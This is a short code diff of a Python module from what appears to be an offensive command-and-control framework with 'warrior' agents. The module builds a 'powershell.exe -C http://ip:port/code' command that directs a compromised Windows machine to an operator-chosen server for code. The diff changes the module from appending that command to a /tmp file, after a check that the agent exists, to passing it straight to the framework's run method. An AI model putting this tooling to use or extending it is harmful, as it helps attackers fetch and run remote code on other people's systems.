@@ -1,5 +1,4 @@
 from termcolor import colored, cprint
-from warrior_check import exist_warrior
 from module import Module
 
 
@@ -20,18 +19,9 @@ class CustomModule(Module):
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        if exist_warrior():
-            function = ""
-
-            if self.args["port"]:
-                function += 'powershell.exe -C http://{}:{}/{}'.format(self.args["ip"], self.args["port"], self.args["code"])
-            else:
-                function += 'powershell.exe -C http://{}/{}'.format(self.args["ip"],self.args["code"])
-
-            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
-                f.write(function)
-
-            cprint ('[+] Done!', 'green')
-
+        if self.args["port"]:
+            function = 'powershell.exe -C http://{}:{}/{}'.format(self.args["ip"], self.args["port"], self.args["code"])
         else:
-            cprint ('[!] Failed... Warrior don´t found', 'red')
+            function = 'powershell.exe -C http://{}/{}'.format(self.args["ip"],self.args["code"])
+
+        super(CustomModule, self).run(function)
